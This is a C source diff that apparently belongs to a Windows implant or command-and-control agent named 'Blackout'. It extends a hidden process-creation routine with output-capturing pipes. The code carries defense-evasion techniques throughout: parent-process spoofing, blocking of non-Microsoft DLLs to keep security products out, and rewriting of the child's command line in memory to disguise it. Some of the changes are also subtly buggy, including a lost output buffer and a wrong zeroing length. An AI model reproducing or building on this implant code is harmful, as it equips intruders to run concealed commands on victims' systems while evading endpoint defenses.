@@ -88,19 +88,21 @@ FUNC DWORD bkProcessTerminate(
 
 
 FUNC DWORD bkProcessCreate(
-    _In_ PSTR ProcCmd,
-    _In_ BOOL InheritHandle,
+    _In_      PSTR    ProcCmd,
+    _In_      BOOL    InheritHandle,
+    _In_      BOOL    Pipe,
     _In_opt_  DWORD   Flags,
     _Out_opt_ HANDLE *ProcessHandle,
     _Out_opt_ DWORD  *ProcessId,
     _Out_opt_ HANDLE *ThreadHandle,
-    _Out_opt_ DWORD  *ThreadId
+    _Out_opt_ DWORD  *ThreadId,
+    _In_opt_  PSTR    Output,
+    _Out_opt_ UINT32 *OutSize
 ) {
     BLACKOUT_INSTANCE
 
-    BOOL bCheck = FALSE;
-
-    UINT16 Count = 0;
+    BOOL   bCheck = FALSE;
+    UINT16 Count  = 0;
 
     PROCESS_INFORMATION          Pi             = { 0 };
     STARTUPINFOEXA               Si             = { 0 };
@@ -113,13 +115,33 @@ FUNC DWORD bkProcessCreate(
     PVOID                        AttrBuff       = NULL;
     UINT64                       Policy         = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
     HANDLE                       hParentProcess = NULL;
- 
+    HANDLE                       hStdPipeRead   = NULL;
+    HANDLE                       hStdPipeWrite  = NULL;
+    BOOL                         bPipeRead      = TRUE;
+    UCHAR                        Buffer[1025]   = { 0 };
+    UINT32                       PipesBytesRead = 0;
+    UINT32                       PipeBufferSize = 0;
+    SECURITY_ATTRIBUTES          SecAttr        = { 0 };
+
     MmZero( &Pi, sizeof( PROCESS_INFORMATION ) );
     MmZero( &Si, sizeof( STARTUPINFOEXA ) );
 
-    Si.StartupInfo.cb          = sizeof( STARTUPINFOEXA );
-    Si.StartupInfo.wShowWindow = SW_HIDE;
-    Si.StartupInfo.dwFlags     = EXTENDED_STARTUPINFO_PRESENT;
+    if ( Pipe ) {
+        SecAttr.bInheritHandle       = TRUE;
+        SecAttr.nLength              = sizeof( SECURITY_ATTRIBUTES );
+        SecAttr.lpSecurityDescriptor = NULL;
+
+        Instance()->Win32.CreatePipe( &hStdPipeRead, &hStdPipeWrite, &SecAttr, 0 );
+
+        Si.StartupInfo.hStdError  = hStdPipeWrite;
+        Si.StartupInfo.hStdOutput = hStdPipeWrite;
+        Si.StartupInfo.dwFlags    = STARTF_USESTDHANDLES;
+        InheritHandle = TRUE;
+    }
+
+    Si.StartupInfo.cb           = sizeof( STARTUPINFOEXA );
+    Si.StartupInfo.wShowWindow  = SW_HIDE;
+    Si.StartupInfo.dwFlags     += EXTENDED_STARTUPINFO_PRESENT;
 
     if ( Blackout().Fork.Argue     ) Count++;
     if ( Blackout().Fork.Blockdlls ) Count++;
@@ -142,8 +164,7 @@ FUNC DWORD bkProcessCreate(
     if ( Blackout().Fork.Blockdlls || Blackout().Fork.Ppid || Blackout().Fork.Argue ) Si.lpAttributeList = AttrBuff;
 
     bCheck = Instance()->Win32.CreateProcessA( NULL, ProcCmd, NULL, NULL, InheritHandle, Flags, NULL, NULL, &Si.StartupInfo, &Pi );
-    if ( !bCheck )
-        return NtLastError();
+    if ( !bCheck ) goto _Leave;
 
     *ProcessId     = Pi.dwProcessId;
     *ProcessHandle = Pi.hProcess;
@@ -152,15 +173,44 @@ FUNC DWORD bkProcessCreate(
 
     if ( Blackout().Fork.Argue ) {
         Instance()->Win32.NtQueryInformationProcess( Pi.hProcess, ProcessBasicInformation, &Pbi, sizeof( PROCESS_BASIC_INFORMATION ), &RetLen );
-        Instance()->Win32.ReadProcessMemory( Pi.hProcess, Pbi.PebBaseAddress, Peb, sizeof( PEB ), BytesRead );
+        Instance()->Win32.ReadProcessMemory( Pi.hProcess, Pbi.PebBaseAddress, Peb, sizeof( PEB ), &BytesRead );
         Instance()->Win32.ReadProcessMemory( Pi.hProcess, Peb->ProcessParameters, Upp, sizeof( RTL_USER_PROCESS_PARAMETERS ) + 0xFF, &BytesRead );
         Instance()->Win32.WriteProcessMemory( Pi.hProcess, Upp->CommandLine.Buffer, Blackout().Fork.Argue, StringLengthW( Blackout().Fork.Argue ) * 2 + 1, &BytesRead );
+        Instance()->Win32.NtResumeThread( Pi.hThread, 0 );
     }
 
-    Instance()->Win32.NtResumeThread( Pi.hThread, 0 );
+    if ( Pipe ) {
+        bkHandleClose( hStdPipeWrite );
 
-    //if ( AttrBuff ) Instance()->Win32.delet
-    // if ( AttrBuff ) bkHeapFree( AttrBuff, AttrSize );
+        do {
+            bPipeRead = Instance()->Win32.ReadFile( hStdPipeRead, Buffer, 1024, &PipesBytesRead, NULL );
+
+            BK_PRINT( "%s\n", Buffer );
+
+            if ( !PipesBytesRead ) break;
+
+            Output = Instance()->Win32.LocalReAlloc(
+                Output, PipeBufferSize + PipesBytesRead,
+                LMEM_MOVEABLE | LMEM_ZEROINIT
+            );
+
+            PipeBufferSize += PipesBytesRead;
+
+            MmCopy( Output + ( PipeBufferSize - PipesBytesRead ), Buffer, PipesBytesRead );
+            MmZero( Buffer, BytesRead );
+
+        } while ( bPipeRead );
+
+        *OutSize = PipeBufferSize;
+    }
+
+_Leave:
+    if ( AttrBuff      ) Instance()->Win32.DeleteProcThreadAttributeList( AttrBuff );
+    if ( AttrBuff      ) bkHeapFree( AttrBuff, AttrSize );
+    if ( Peb           ) bkHeapFree( Peb, sizeof( PEB ) );
+    if ( Upp           ) bkHeapFree( Upp, sizeof( RTL_USER_PROCESS_PARAMETERS ) );
+    if ( hStdPipeRead  ) bkHandleClose( hStdPipeRead );
+    if ( hStdPipeWrite ) bkHandleClose( hStdPipeWrite );
 
     return NtLastError();    
 }
